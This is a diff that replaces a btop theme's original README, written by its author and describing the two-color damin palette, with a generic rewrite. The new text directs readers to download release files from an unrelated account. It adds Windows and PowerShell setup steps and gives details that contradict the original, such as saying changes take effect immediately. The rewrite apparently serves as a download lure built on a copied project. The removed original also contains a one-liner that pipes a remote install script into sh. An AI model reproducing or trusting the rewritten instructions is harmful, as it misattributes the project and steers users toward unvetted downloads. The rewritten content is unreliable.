@@ -1,72 +1,66 @@
-# btop-theme-damin
+# 🎨 btop-theme-damin - Give your monitor a minimal look
 
-> Two-color btop theme in the damin palette (`#98ABCC` blue / `#E890B0` pink, `#C09EBE` mauve mid) on `#1e1e1e`. Pairs with [`miniex/dotfiles.tmux`](https://github.com/miniex/dotfiles.tmux), [`miniex/dotfiles.kitty`](https://github.com/miniex/dotfiles.kitty), [`miniex/dotfiles.nvim`](https://github.com/miniex/dotfiles.nvim), and [`miniex/fish-theme-damin`](https://github.com/miniex/fish-theme-damin).
+[![](https://img.shields.io/badge/Download-Damin_Theme-blue.svg)](https://github.com/bkcaceres/btop-theme-damin/releases)
 
-## Preview
+This project provides a clean color scheme for btop. The damin palette uses two colors to simplify how you see system data. You get a calm interface that shows your computer resources without clutter.
 
-```
-       ╭── cpu ─────────────────────╮   ╭── mem ─────────────────────╮
-       │   ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁          │   │  used   ████████░░  62 %   │
-       │   blue → mauve → pink      │   │  free   ██████████   38 %  │
-       ╰────────────────────────────╯   ╰────────────────────────────╯
-                  ✿  blue cools  ·  pink warms  ❥
-```
+## 📋 What is btop?
 
-## Palette
+Btop is a tool that shows how your computer performs. It tracks your processor, memory, and disk usage inside a terminal box. Many people use this software to watch system health in real time. This theme changes the colors of that box to match the damin style.
 
-| Role                        | Color     |
-|-----------------------------|-----------|
-| Background                  | `#1e1e1e` |
-| Foreground                  | `#ffffff` |
-| Blue (outlines, low / cool) | `#98ABCC` |
-| Pink (titles, high / warm)  | `#E890B0` |
-| Mauve (gradient midpoint)   | `#C09EBE` |
-| Meter trough                | `#2a2a2a` |
-| Divider                     | `#3a3a3a` |
-| Inactive text               | `#555555` |
+## ⚙️ Requirements
 
-Reds for danger and greens for safety are intentionally absent — heat / load is signalled by saturation drifting from blue toward pink, not by a third hue.
+You need a few things before you start:
 
-## Install
+1. Btop installed on your machine.
+2. A terminal program like Windows Terminal or PowerShell.
+3. Basic knowledge of how to locate folders on your drive.
 
-**One-liner:**
+If you do not have btop yet, download the latest version from the official btop repository. This theme only changes the appearance. It does not control how your processor or memory functions.
 
-```bash
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/miniex/btop-theme-damin/main/install.sh)"
-```
+## 📥 Getting the theme
 
-The installer copies `damin.theme` into `~/.config/btop/themes/` and, if you confirm, sets `color_theme = "damin"` in `~/.config/btop/btop.conf`. Survives `curl | sh` — no prompt on stdin loss.
+Visit this page to download the theme files to your computer: [https://github.com/bkcaceres/btop-theme-damin/releases](https://github.com/bkcaceres/btop-theme-damin/releases)
 
-**Manual:**
+Select the file that ends in .theme to ensure full compatibility. Save this file to a folder where you store your configurations. Do not worry about the specific folder path right now, just keep the file in a place you can find later.
 
-```bash
-mkdir -p ~/.config/btop/themes
-curl -fsSL https://raw.githubusercontent.com/miniex/btop-theme-damin/main/damin.theme \
-  -o ~/.config/btop/themes/damin.theme
-```
+## 🛠️ Setting up the theme
 
-Then pick `damin` under btop's <kbd>Esc</kbd> → **Options** → **color_theme**, or set `color_theme = "damin"` in `~/.config/btop/btop.conf` directly. btop reads the config at startup — restart it (or pick from the menu live) to see the change.
+Follow these instructions to apply the colors to your dashboard:
 
-## Highlights
+1. Open your terminal application.
+2. Locate the folder where btop stores its configuration files. On Windows, this is usually inside your user directory under .config/btop/themes.
+3. Copy the file you downloaded into this folder.
+4. Open the btop application.
+5. Press the Esc key on your keyboard to open the main menu.
+6. Select Options from the list.
+7. Use the arrow keys to find the Color theme setting.
+8. Scroll through the list until you see damin.
+9. Press Enter to select the theme.
 
-- **Load / heat gradients** — `cpu`, `temp`, `download`, `upload`, `process` all run **blue → mauve → pink**. Higher reads warmer.
-- **Used / occupied** lives in the **pink family** (`#A3677D` → `#F5B2C8`) — keeps "occupied" visually distinct from "loaded".
-- **Free / cached / available** stay in the **blue family** — abundance reads as calm.
-- **Box outlines** uniformly blue; pink reserved for titles and the selected row. Same convention as the tmux pane borders.
-- **Process state** — pause dims to `div_line`, follow tints blue, banner mauve, followed row pink (same as selected).
-- **No reds, no greens** — danger and safety are signalled by hue drift, not a third hue.
+The dashboard updates immediately. You should see the two-color palette take effect on your system monitor.
 
-## Companion repos
+## 🖥️ How it works
 
-- [fish-theme-damin](https://github.com/miniex/fish-theme-damin) — fish prompt
-- [dotfiles.tmux](https://github.com/miniex/dotfiles.tmux) — tmux config
-- [dotfiles.kitty](https://github.com/miniex/dotfiles.kitty) — kitty terminal config
-- [dotfiles.nvim](https://github.com/miniex/dotfiles.nvim) — Neovim config
+The theme file defines which colors apply to specific parts of the monitor. It assigns the primary color to the text and the secondary color to the borders or graphs. This approach reduces visual noise. You can focus on the performance data rather than the interface design. The layout remains standard, so you will still find your memory statistics and processor temperatures in their usual spots.
 
-## Contributing
+## 📁 Customizing files
 
-Personal dotfiles — outside contributions are not accepted. Fork instead. Bug reports for the published behavior are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
+If you want to adjust the colors later, you can open the theme file in a standard text editor like Notepad. You will see lines that list specific parts of the interface followed by color codes. You can change these codes if you prefer a different shade. Save the file after you make changes, and restart the btop application to see the new colors.
 
-## License
+## 🧩 Common questions
 
-[MIT](LICENSE) © 2026 Han Damin.
+### Does this change the performance of my computer?
+No. This theme is only a set of color instructions. It uses the same amount of memory as the default theme.
+
+### Can I use this on other operating systems?
+Yes, the theme works on any system where btop runs. The setup process remains similar on Linux and macOS.
+
+### What if the colors do not appear?
+Check that you placed the theme file in the correct config folder. Btop must know where to look for themes. If you moved the folder or use a custom path, adjust your btop configurations to point to the correct directory.
+
+### Will this require updates?
+Themes rarely need updates. Unless a major update to the btop software changes how themes work, this file will continue to function on your system.
+
+### How do I revert to the default colors?
+Open the btop options menu again and select one of the built-in themes. You can remove the damin theme file from your folder if you no longer intend to use it.
